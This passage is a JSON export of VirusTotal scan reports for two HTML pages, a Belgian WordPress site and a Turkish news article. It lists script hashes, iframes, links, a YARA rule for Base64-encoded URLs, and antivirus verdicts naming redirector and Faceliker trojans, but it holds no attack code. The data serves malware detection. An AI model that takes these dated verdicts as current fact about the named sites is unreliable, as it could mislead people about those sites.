            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "8ffe4c246b49ab6b8a6cc862f4e28b8da18ff57f04a2cfe008cd1c1a165ae2f0"
          },
          {
            "attributes": {
              "src": "http://www.satiricon.be/wp-includes/js/wp-embed.min.js?ver=5.7.2",
              "type": "text/javascript",
              "id": "wp-embed-js"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "84ce9baf84128422fd7745394213c8af0880db12c909db322beb7e723055b082"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "e985846bb869b1c9c392e042ed939cc0bcdb49e481ed1a4b8b986453d19cb3d5"
          },
          {
            "attributes": {
              "src": "http://www.satiricon.be/fbObjectValidationV2.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "e7d208148e0a05fd14eeb2a2fb7d2fca4c49f0bff0f0e177bba1cab67d764e6b"
          }
        ],
        "html_meta": {
          "google-site-verification": [
            "ubOt2U1ja66DWIl2491Ev3R24PVNEUgNhrR86qPJ2HU",
            "CsPHYXGRCv1U4mdk2VLcYKcjilEttODO9b8ga4e3VZg"
          ],
          "robots": [
            "max-image-preview:large"
          ],
          "generator": [
            "WordPress 5.7.2"
          ]
        }
      },
      "last_submission_date": 1696598154,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "19f4d709d2d2be761fce2f8324d22440b09ec8bf3ad65787e3dea138b18fd6fc",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696625712,
      "unique_sources": 1,
      "first_submission_date": 1696598154,
      "ssdeep": "384:xQ60hakxXZexTQdlQO+FVyAZcp0SUeVEq0ryZI9YooS3wnDc+UT:xQLalFVzZcp0SUeVEq0rya9Jwn9A",
      "md5": "79564be739fbf8610e06415268888a9a",
      "sha1": "cd2b77b1a8628779f483a9a094e4b77925969bff",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (5603u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 38,
        "undetected": 22
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.Generic.4!c",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Nemucod.TU",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.Redirector.nq",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Malware.Generic-JS.Save.0a00cb1a",
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49803",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49803",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Baidu": {
          "category": "malicious",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": "JS.Trojan.Iframe.hw",
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.552",
          "result": "Trojan.JS.X-Redir.BRC",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28030",
          "result": "JS/Iframe.MD",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "JS_REDIR.SMCP2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-BZE [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Agent.ecnmvy",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Redir/JS!1.A397 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-06.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Troj/JSRedir-RD",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.HTML/Infected.WebPage.Gen2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "JS.IFrame.793",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "JS_REDIR.SMCP2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "JS:Trojan.Cryxos.77 (B)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Trojan.Script.poc",
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "JS/Redir.YE!Eldorado",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HTML/Infected.WebPage.Gen2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "Trojan:JS/Redirector.PR",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36062",
          "result": "TrojWare.JS.Iframe.MDA@7duh66",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36615B:27.33404",
          "result": "HTML.Trojan.Redirector.AN",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696622503",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "JS:Trojan.Cryxos.77",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=88)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Heur:Trojan.Script.LS_Gencirc.7054709.1",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.JS.IFrame",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.W32.redirector.ad",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/PACKED.D79C!tr",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-BZE [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      }
    },
    "type": "file",
    "id": "19f4d709d2d2be761fce2f8324d22440b09ec8bf3ad65787e3dea138b18fd6fc",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/19f4d709d2d2be761fce2f8324d22440b09ec8bf3ad65787e3dea138b18fd6fc"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fdef25047c7018f82ad4"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T12CF20ACEAD89E82F4563827AF5F1EB04A05B2663D201CCC570AE841B7FC1FDA695631D",
      "vhash": "htm:3e74c00a4e4af5d71196838ad4ba0d82",
      "type_tags": [
        "internet",
        "html"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.",
          "source": "https://github.com/InQuest/yara-rules-vt",
          "author": "InQuest Labs",
          "ruleset_name": "Base64_Encoded_URL",
          "rule_name": "Base64_Encoded_URL",
          "ruleset_id": "0122bae1e9"
        }
      ],
      "names": [],
      "last_modification_date": 1706320916,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 37516,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.faceliker/ghmk",
        "popular_threat_category": [
          {
            "count": 19,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 9,
            "value": "faceliker"
          },
          {
            "count": 6,
            "value": "ghmk"
          },
          {
            "count": 2,
            "value": "autolike"
          }
        ]
      },
      "html_info": {
        "iframes": [
          {
            "attributes": {
              "allowtransparency": "true",
              "src": "http://www.facebook.com/plugins/like.php?href=http://www.facebook.com/yolguzergahi&layout=button_count&show_faces=false&width=50&action=like&colorscheme=light&height=21",
              "style": "border: none; overflow: hidden; width: 45px; left: -19px; height: 21px; z-index: 0; position: relative;",
              "scrolling": "no",
              "frameborder": "0"
            }
          },
          {
            "attributes": {
              "src": "http://ad.hepsiburada.com/advEngine.aspx?accountID=11b42608-fd1b-40a8-a59d-bf1da3bfe64e&categoryID=25&sizeID=8",
              "height": "60px",
              "scrolling": "no",
              "frameborder": "0",
              "width": "468px"
            }
          },
          {
            "attributes": {
              "allowtransparency": "true",
              "src": "http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FDestegi%2F173214066036266&width=270&colorscheme=light&connections=8&stream=false&header=true&height=290",
              "style": "border:none; overflow:hidden; width:270px; height:290px;",
              "scrolling": "no",
              "frameborder": "0"
            }
          }
        ],
        "title": "Fenerbahçe’de hakem deklarasyonu - Rafist Genel Bilgiler",
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "eb5594be6cf5301bf0a7bd3e475cea4e1153c71f6a1cc1aa2f5cccd337e023d0"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d562453e054f8c9ff50c1335de1fdd4e2a484b8c05c91a25a5fde55f4de760c4"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "538c2003bbdb171442b07a19005b47efed1eed218b955e8ce2e385712f5d234a"
          },
          {
            "attributes": {
              "src": "http://code.jquery.com/jquery-1.10.2.min.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6c47ce9722ed00436954a66ce739831c7eac9274e3a50832aee7c428abe02cdc"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "dc633901ff61bb40eb4022e1b63a118277adbb2d5e4e1994abce0db6840a83d1"
          },
          {
            "attributes": {
              "src": "http://platform.twitter.com/widgets.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6fab79f09cede700a9eaa896e749287660d0a1f39d243434985924232e4e71f0"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "57a7669e7004fad966f576aba58c12e86569954f6342fe8266e0f8106eed905b"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9ed7b86cc462e6fb331cad7ce9e046c3cb1b4e5d6f7297005253d36821f83c02"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "2f9a031f562d63681960bbc2ca186b83fa42ecdafd66133335bed53a777c5c5b"
          },
          {
            "attributes": {
              "src": "http://www.google.com/friendconnect/script/friendconnect.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "a5cd95986cfa8c38edc79334504f0d4c79df2b33c992ad968a21306085d3c23b"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "e8e1636ccdb2b7951726743caac21a2ade86b909e13cf634a3a8246d7ef35537"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "006cd3619ab40d259ab7623aec6f93eeaa294a218588bda0296f71bb7c878aed"
          },
          {
            "attributes": {
              "id": "_wauf2m"
            },
            "sha256": "22e151576fe2a58f150d6060d266a5e7145852081c8299b7c67fde8b67a8fb30"
          },
          {
            "attributes": {
              "src": "http://xslt.alexa.com/site_stats/js/t/a?url=www.rafist.com",
              "type": "text/javascript",
              "language": "JavaScript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "4fb90d7c0311c34ac66d2e81127394cb95586f243aa4180c739f15f6ad8ece07"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "740639ac4e25383876aed501a498ef77115762b544e8b3ef6afcea8e581438c2"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "8973f1dbe09994469dc37c4d48453881ac0ba1b7eccca514daad88fba1da7ef2"
          },
          {
            "attributes": {
              "type": "text/javascript",
              "language": "JavaScript"
            },
            "sha256": "d1eda05435600f9ffe648d96770ad814b016bc12f4c2995bd81b85581f1feb9f"
          }
        ],
        "html_meta": {
          "googlebot": [
            "index, follow",
            "index, archive",
            "all"
          ],
          "classification": [
            "forex"
          ],
          "abstract": [
            "forex"
          ],
          "revisit-after": [
            "1 days"
          ],
          "msvalidate.01": [
            "2E0F73969ABB38975E9B1CB39D6A8C1D",
            "2E0F73969ABB38975E9B1CB39D6A8C1D"
          ],
          "keywords": [
            "fenerbahçe,hakem,spor"
          ],
          "gigabot": [
            "index, archive",
            "index, follow",
            "all"
          ],
          "dmozbot": [
            "index, follow"
          ],
          "content-language": [
            "tr"
          ],
          "author": [
            "forex"
          ],
          "msnbot": [
            "index, follow"
          ],
          "excitebot": [
            "index, follow"
          ],
          "lycosbot": [
            "index, follow"
          ],
          "iwonbot": [
            "index, follow"
          ],
          "verify-v1": [
            "RpuzsAd0ofFwNLTs6Giwf/EJCmx3wZKxo+UOXPj66Iw="
          ],
          "description": [
            "Fenerbahçe Kulübü'nün, Fortis Türkiye Kupası'nda hafta içinde Galatasaray ile yapılan çeyrek final rövanş maçındaki hakem kararlarına yönelik"
          ],
          "robots": [
            "index, follow",
            "index, archive",
            "all"
          ],
          "askbot": [
            "index, follow"
          ],
          "alexabot": [
            "index, follow"
          ],
          "generator": [
            "WordPress 3.5.1",
            "WordPress 3.5.1"
          ],
          "altavistabot": [
            "index, follow"
          ],
          "aolbot": [
            "index, follow"
          ],
          "google-site-verification": [
            "Bqf4GbgKhLsZM44DUP7zLOzJZPvWmvBDwVjrI4fobsw"
          ],
          "gigablast": [
            "index, follow"
          ],
          "yahoobot": [
            "index, follow"
          ]
        },
        "hrefs": [
          "http://www.rafist.com/wp-content/themes/internet-10/style.css",
          "http://www.rafist.com/feed",
          "http://www.rafist.com/spor/fenerbahcede-hakem-deklarasyonu.html/feed",
          "http://www.rafist.com/wp-content/plugins/add-to-any/addtoany.min.css?ver=1.4",
          "http://www.rafist.com/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70",
          "http://www.rafist.com/xmlrpc.php?rsd",
          "http://www.rafist.com/wp-includes/wlwmanifest.xml",
          "http://www.rafist.com/ekonomi/basbakanlikta-ekonomi-zirvesi.html",
          "http://www.rafist.com/ekonomi/keyde-hesaplar-karisti.html",
          "http://www.rafist.com/spor/fenerbahcede-hakem-deklarasyonu.html",
          "http://www.rafist.com/?p=4672",
          "http://www.rafist.com/",
          "javascript:window.external.AddFavorite('http://www.rafist.com','iki dakika da haberler')",
          "http://www.rafist.com",
          "http://www.rafist.com/adsense",
          "http://www.rafist.com/gazete-mansetleri",
          "http://www.rafist.com/iletisim",
          "http://www.rafist.com/kullanim-sozlesmesi",
          "http://www.rafist.com/yasal-uyari",
          "http://www.cnc.ist",
          "http://twitter.com/yucinbil",
          "http://twitter.com/share?url=http://www.rafist.com/spor/fenerbahcede-hakem-deklarasyonu.html&via=&text=Fenerbahçe'de hakem deklarasyonu&related=:&lang=en&count=horizontal",
          "http://www.addtoany.com/share_save",
          "http://www.firsatteklifi.com/evbasvuru.html?bid=468&aid=CD1089&opt=",
          "http://www.rafist.com/yasam/cicek-saksilari.html",
          "http://www.rafist.com/gundem/cocuk-kitaplari-web-sitesi-acildi.html",
          "http://www.rafist.com/gundem/fabrika-insaati-web-sitesi-acildi.html",
          "http://www.rafist.com/ekonomi/hazir-beton.html",
          "http://www.rafist.com/teknoloji/pirelli-2012-takvimi-cekimi-galeri.html",
          "http://www.rafist.com/teknoloji/kral-oyun-oyna-ucretsiz-oyun-oyna-hafiza-oyunlari-burada-3.html",
          "http://www.rafist.com/teknoloji/oyun-oyna-3d-oyunla-araba-oyunu-silah-oyunu-flash-oyunlar-burada.html",
          "http://www.rafist.com/teknoloji/fatmagulun-sucu-ne-yeni-sezon-ilk-fragmani-sitemizde-2011fatmagulun-sucu-ne-yeni-sezon-fragman-video-izle-kanal-d-eylul-2011.html",
          "http://www.rafist.com/teknoloji/oyle-bir-gecer-zamanki-dizisi-yeni-sezon-ilk-fragmani-izle.html",
          "http://www.rafist.com/teknoloji/2011-universite-harclari-universite-kayit-evraklari-2011-2012.html",
          "http://www.rafist.com/kategori/spor",
          "#comments",
          "http://del.icio.us/post?url=http://www.rafist.com/spor/fenerbahcede-hakem-deklarasyonu.html&title=Fenerbahçe’de hakem deklarasyonu ",
          "http://www.digg.com/submit?phase=2&url=http://www.rafist.com/spor/fenerbahcede-hakem-deklarasyonu.html&title=Fenerbahçe’de hakem deklarasyonu",
          "http://www.rafist.com/wp-login.php",
          "http://www.teknikhirdavatci.com",
          "http://www.mardenhotel.com",
          "http://www.avrupasu",
          "http://www.yapimarketler.com",
          "http://www.rafist.com/comments/feed",
          "http://www.gthtools.com",
          "http://www.ekizlermakine.com",
          "http://www.kalipci.com",
          "http://www.makineci.com",
          "mailto:info@rafist.com",
          "http://www.wordpress.org",
          "http://www.sayyac.com/",
          "http://www.rafist.com/sitemap.xml",
          "http://www.toplist.cz/",
          "http://www.toplist.sk/"
        ]
      },
      "last_submission_date": 1700728277,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "afdd0e4dde2a95cab326532cba33923c0c581a34800798b8396852d29fcd492f",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1700822891,
      "unique_sources": 1,
      "first_submission_date": 1700728277,
      "ssdeep": "768:aY0IOWBL2lJTJlcVpHd7I0SVrg94VP04O3zMb7zBCtdEES:aY0IOWBL2lJTJlcVp97I0SVrDVP0P3gz",
      "md5": "78fa54421bc2fdc2f041c0b74756f492",
      "sha1": "616de0399dba00e562743c6c981683181bc7b695",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (797u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 39,
        "undetected": 21
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.Faceliker.4!c",
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231124"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
